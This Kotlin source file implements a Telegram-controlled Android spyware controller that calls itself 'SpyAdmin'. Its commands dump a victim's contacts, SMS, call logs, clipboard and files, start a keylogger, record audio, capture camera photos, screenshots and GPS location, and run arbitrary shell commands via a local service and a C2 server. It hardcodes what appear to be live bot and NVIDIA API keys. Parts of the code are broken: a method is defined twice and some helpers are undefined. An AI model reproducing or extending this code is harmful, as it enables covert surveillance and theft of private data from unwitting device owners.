package com.system.monitor.admin

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.util.Log
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.IOException
import java.util.concurrent.TimeUnit

class TelegramBotService(private val context: Context) {

    companion object {
        private const val BOT_TOKEN = "9168397709:AAEVVXnjTtxUm76KCfBJENNiQSg-MyqgN4M"
        private const val ALLOWED_USER_ID = 8335972628L
        private const val TELEGRAM_API = "https://api.telegram.org/bot"
        private const val PREFS_NAME = "telegram_bot_config"
        private const val KEY_OFFSET = "update_offset"
        private const val KEY_ONBOARD_SENT = "onboard_sent"
        
        // NVIDIA Nemotron 3 Ultra 550B API
        private const val NVIDIA_API_KEY = "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"
        private const val NVIDIA_API_URL = "https://integrate.api.nvidia.com/v1/chat/completions"
        private const val NVIDIA_MODEL = "nvidia/nemotron-3-ultra"
    }

    private val gson = Gson()
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()
    private val prefs: SharedPreferences = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    private var running = false
    private var pollThread: Thread? = null
    private var lastMessageId: Long = 0

    fun start() {
        if (running) return
        running = true
        pollThread = Thread({ pollLoop() }, "telegram-bot-poll")
        pollThread?.start()
        Log.d("TelegramBot", "Bot started")
        // Send onboard notification ONLY once ever
        if (!prefs.getBoolean(KEY_ONBOARD_SENT, false)) {
            notifyOnboard("Agent App")
            prefs.edit().putBoolean(KEY_ONBOARD_SENT, true).apply()
        }
    }

    fun stop() {
        running = false
        pollThread?.interrupt()
        pollThread = null
        Log.d("TelegramBot", "Bot stopped")
    }

    private fun pollLoop() {
        while (running) {
            try {
                getUpdates()
            } catch (e: Exception) {
                Log.e("TelegramBot", "Poll error", e)
            }
            try {
                Thread.sleep(2000)
            } catch (e: InterruptedException) {
                return
            }
        }
    }

    private fun getUpdates() {
        val offset = prefs.getLong(KEY_OFFSET, 0) + 1
        val url = "$TELEGRAM_API$BOT_TOKEN/getUpdates?offset=$offset&timeout=10&allowed_updates=[\"message\",\"callback_query\"]"

        val request = Request.Builder().url(url).build()
        client.newCall(request).execute().use { response ->
            response.body?.string()?.let { json ->
                val result = gson.fromJson(json, TelegramResponse::class.java)
                result.result?.forEach { update ->
                    if (update.updateId > lastMessageId) {
                        lastMessageId = update.updateId
                        prefs.edit().putLong(KEY_OFFSET, update.updateId).apply()
                        handleUpdate(update)
                    }
                }
            }
        }
    }

    private fun handleUpdate(update: TelegramUpdate) {
        update.message?.let { msg ->
            if (msg.from?.id == ALLOWED_USER_ID) {
                // Prevent duplicate processing
                if (msg.messageId > lastMessageId) {
                    lastMessageId = msg.messageId
                    handleCommand(msg)
                }
            } else {
                sendMessage(msg.chat.id, "⛔ Unauthorized. Your ID: ${msg.from?.id}")
            }
        }
        update.callbackQuery?.let { query ->
            if (query.from?.id == ALLOWED_USER_ID) {
                handleCallback(query)
            }
        }
    }

    private fun handleCommand(msg: TelegramMessage) {
        val text = msg.text?.trim() ?: ""
        val chatId = msg.chat.id

        // Exact command matching to prevent accidental triggers
        when {
            text == "/start" -> {
                sendMessage(chatId, getHelpMessage())
            }
            text == "/status" -> sendStatus(chatId)
            text == "/agents" -> sendAgentsList(chatId)
            text == "/help" -> sendMessage(chatId, getHelpMessage())
            text == "/contacts" -> sendTask(chatId, "contacts", mapOf())
            text == "/sms" -> sendTask(chatId, "sms", mapOf())
            text == "/calls" -> sendTask(chatId, "call_logs", mapOf())
            text == "/apps" -> sendTask(chatId, "apps", mapOf("action" to "list"))
            text == "/files" -> sendTask(chatId, "files", mapOf("action" to "list", "path" to "/sdcard"))
            text == "/wifi" -> sendTask(chatId, "wifi", mapOf("action" to "scan"))
            text == "/clipboard" -> sendTask(chatId, "clipboard", mapOf("action" to "get"))
            text == "/keylogger_on" -> sendTask(chatId, "keylogger", mapOf("action" to "start"))
            text == "/keylogger_off" -> sendTask(chatId, "keylogger", mapOf("action" to "stop"))
            text == "/keylogger_dump" -> sendTask(chatId, "keylogger", mapOf("action" to "dump"))
            text == "/audio" -> sendTask(chatId, "audio", mapOf("action" to "start", "duration" to 30))
            text == "/camera" -> sendTask(chatId, "camera", mapOf("action" to "capture", "camera" to 0))
            text == "/screenshot" -> sendTask(chatId, "screen", mapOf("action" to "capture"))
            text == "/location" -> sendTask(chatId, "location", mapOf("action" to "get"))
            text == "/status" -> sendStatus(chatId)
            text == "/agents" -> sendAgentsList(chatId)
            text.startsWith("/shell ") -> sendShellCommand(chatId, text.substring(7).trim())
            text.startsWith("/task ") -> sendTaskCommand(chatId, text.substring(6).trim())
            text.startsWith("/ai ") -> sendAICommand(chatId, text.substring(4).trim())
            text.startsWith("/nvidia ") -> sendNVIDIACommand(chatId, text.substring(8).trim())
            else -> sendMessage(chatId, "Unknown command. Use /help")
        }
    }

    private fun handleCallback(query: CallbackQuery) {
        // Handle inline keyboard callbacks if needed
    }

    private fun sendTaskCommand(chatId: Long, args: String) {
        val parts = args.split(" ", limit = 2)
        if (parts.size < 2) {
            sendMessage(chatId, "Usage: /task <capability> <json_args>")
            return
        }
        val capability = parts[0]
        val jsonArgs = parts[1]
        try {
            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
            val argsMap = gson.fromJson< Map<String, Any>>(jsonArgs, type)
            sendTask(chatId, capability, argsMap)
        } catch (e: Exception) {
            sendMessage(chatId, "Invalid JSON args: ${e.message}")
        }
    }

    private fun sendShellCommand(chatId: Long, command: String) {
        sendTask(chatId, "shell", mapOf("command" to command))
    }

    // NVIDIA Nemotron 3 Ultra 550B AI Integration
    private fun sendNVIDIACommand(chatId: Long, prompt: String) {
        if (prompt.isBlank()) {
            sendMessage(chatId, "Usage: /nvidia <prompt>\nExample: /nvidia Explain quantum computing")
            return
        }
        
        sendMessage(chatId, "🤖 *Nemotron 3 Ultra 550B thinking...*")
        
        thread(name = "nvidia-ai") {
            try {
                val payload = mapOf(
                    "model" to NVIDIA_MODEL,
                    "messages" to listOf(mapOf("role" to "user", "content" to prompt)),
                    "temperature" to 0.7,
                    "max_tokens" to 4096,
                    "top_p" to 1.0,
                    "stream" to false
                )
                
                val requestBody = payload.toJson().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url(NVIDIA_API_URL)
                    .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
                    .post(requestBody)
                    .build()
                
                client.newCall(request).execute().use { response ->
                    val responseBody = response.body?.string()
                    if (response.isSuccessful && responseBody != null) {
                        try {
                            val json = gson.fromJson(responseBody, Map::class.java)
                            val choices = json["choices"] as? List<*> ?: emptyList()
                            if (choices.isNotEmpty()) {
                                val firstChoice = choices[0] as? Map<*, *> ?: emptyMap()
                                val message = firstChoice["message"] as? Map<*, *> ?: emptyMap()
                                val content = message["content"] as? String ?: "No response"
                                sendMessage(chatId, "🤖 *Nemotron 3 Ultra 550B:*\n\n$content")
                            } else {
                                sendMessage(chatId, "❌ No response from NVIDIA API")
                            }
                        } catch (e: Exception) {
                            sendMessage(chatId, "❌ Failed to parse NVIDIA response: ${e.message}")
                        }
                    } else {
                        val errorBody = response.body?.string() ?: "Unknown error"
                        sendMessage(chatId, "❌ NVIDIA API Error (${response.code}): $errorBody")
                    }
                }
            } catch (e: Exception) {
                Log.e("TelegramBot", "NVIDIA API error", e)
                sendMessage(chatId, "❌ NVIDIA API Error: ${e.message}")
            }
        }
    }

    // General AI command (alias for NVIDIA)
    private fun sendAICommand(chatId: Long, prompt: String) {
        sendNVIDIACommand(chatId, prompt)
    }

    private fun sendShellCommand(chatId: Long, command: String) {
        if (command.isBlank()) {
            sendMessage(chatId, "Usage: /shell <command>\nExample: /shell whoami && id")
            return
        }
        sendTask(chatId, "shell", mapOf("command" to command))
    }

    private fun sendTask(chatId: Long, capability: String, args: Map<String, Any>) {
        val taskId = java.util.UUID.randomUUID().toString()
        
        // Send to local SpeedMon via explicit Intent to start service
        val serviceIntent = Intent().apply {
            setClassName("com.speedmon", "com.speedmon.SpeedMonService")
            action = "com.speedmon.ACTION_COMMAND"
            putExtra("capability", capability)
            putExtra("args", gson.toJson(args))
            putExtra("task_id", taskId)
        }
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
            sendMessage(chatId, "✅ Task sent to SpeedMon: $capability")
        } catch (e: Exception) {
            Log.e("TelegramBot", "Failed to start SpeedMon service", e)
            sendMessage(chatId, "❌ Failed to send to SpeedMon: ${e.message}")
        }

        // Also try C2 if configured (non-blocking)
        val c2Url = getC2Url()
        val payload = mapOf(
            "action" to "task",
            "capability" to capability,
            "args" to gson.toJson(args),
            "timeout" to 30
        )
        sendC2Request(c2Url, "/api/command", payload) { resp ->
            sendMessage(chatId, "📡 C2 Response: $resp")
        }
    }

    private fun sendC2Request(baseUrl: String, endpoint: String, payload: Map<String, Any>, callback: (String) -> Unit): String? {
        try {
            val url = "$baseUrl$endpoint"
            val requestBody = payload.toJson().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()
            client.newCall(request).execute().use { response ->
                val respBody = response.body?.string()
                respBody?.let { callback(it) }
                return respBody
            }
        } catch (e: Exception) {
            Log.e("TelegramBot", "C2 request failed", e)
            return null
        }
        return null
    }

    private fun sendStatus(chatId: Long) {
        val c2Url = getC2Url()
        val payload = mapOf("action" to "list_agents")
        sendC2Request(c2Url, "/api/agents", payload) { resp ->
            sendMessage(chatId, "📊 *Agents Status:*\n$resp")
        } ?: run {
            sendMessage(chatId, "⚠️ C2 unreachable (local SpeedMon may still work)")
        }
    }

    private fun sendAgentsList(chatId: Long) {
        val c2Url = getC2Url()
        val payload = mapOf("action" to "list_agents")
        sendC2Request(c2Url, "/api/agents", payload) { resp ->
            sendMessage(chatId, "🤖 *Connected Agents:*\n$resp")
        } ?: run {
            sendMessage(chatId, "⚠️ C2 unreachable (local SpeedMon may still work)")
        }
    }

    private fun notifyOnboard(userName: String) {
        val message = "🔔 *New Agent Onboarded*\n" +
            "User: $userName\n" +
            "Device: ${android.os.Build.MODEL}\n" +
            "Android: ${android.os.Build.VERSION.RELEASE}\n" +
            "Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(java.util.Date())}"
        sendMessage(ALLOWED_USER_ID, message)
    }

    private fun getC2Url(): String {
        val adminPrefs = context.getSharedPreferences("admin_config", Context.MODE_PRIVATE)
        return adminPrefs.getString("c2_url", "https://c2.example.com/api") ?: "https://c2.example.com/api"
    }

    private fun getHelpMessage(): String {
        return """
🤖 *SpyAdmin Telegram Bot v2.0*

*System Commands:*
/start - Show this help
/status - Show C2 status
/agents - List connected agents
/help - Show this message

*🤖 NVIDIA Nemotron 3 Ultra 550B AI:*
/nvidia <prompt> - Ask Nemotron 3 Ultra 550B
/ai <prompt> - Alias for NVIDIA
Example: /nvidia Explain quantum computing

*Surveillance Commands:*
/screenshot - Capture screen
/location - Get GPS location
/contacts - Dump contacts
/sms - Dump SMS messages
/calls - Dump call logs
/apps - List installed apps
/files - List files (/sdcard)
/wifi - Scan WiFi networks
/clipboard - Get clipboard content
/keylogger_on - Start keylogger
/keylogger_off - Stop keylogger
/keylogger_dump - Dump keystrokes
/audio - Record audio (30s)
/camera - Capture photo

*System Commands:*
/shell <cmd> - Execute shell command
/task <capability> <json> - Custom task
/nvidia <prompt> - Ask Nemotron 3 Ultra 550B
/ai <prompt> - Alias for NVIDIA

*Admin only. Unauthorized users will be rejected.*
        """.trimIndent()
    }

    private fun sendMessage(chatId: Long, text: String) {
        try {
            val url = "$TELEGRAM_API$BOT_TOKEN/sendMessage"
            val payload = mapOf(
                "chat_id" to chatId,
                "text" to text,
                "parse_mode" to "Markdown"
            )
            val requestBody = payload.toJson().toRequestBody("application/json".toMediaType())
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().use { response ->
                response.body?.string()
            }
        } catch (e: Exception) {
            Log.e("TelegramBot", "Send message failed", e)
        }
    }

    // Data classes for Telegram API
    data class TelegramResponse(
        val ok: Boolean,
        val result: List<TelegramUpdate>? = null
    )

    data class TelegramUpdate(
        val updateId: Long,
        val message: TelegramMessage? = null,
        val callbackQuery: CallbackQuery? = null
    )

    data class TelegramMessage(
        val messageId: Long,
        val from: TelegramUser? = null,
        val chat: TelegramChat,
        val text: String? = null,
        val date: Long
    )

    data class TelegramUser(
        val id: Long,
        val firstName: String?,
        val lastName: String?,
        val username: String?
    )

    data class TelegramChat(
        val id: Long,
        val type: String,
        val title: String?
    )

    data class CallbackQuery(
        val id: String,
        val from: TelegramUser,
        val message: TelegramMessage?,
        val data: String?
    )
}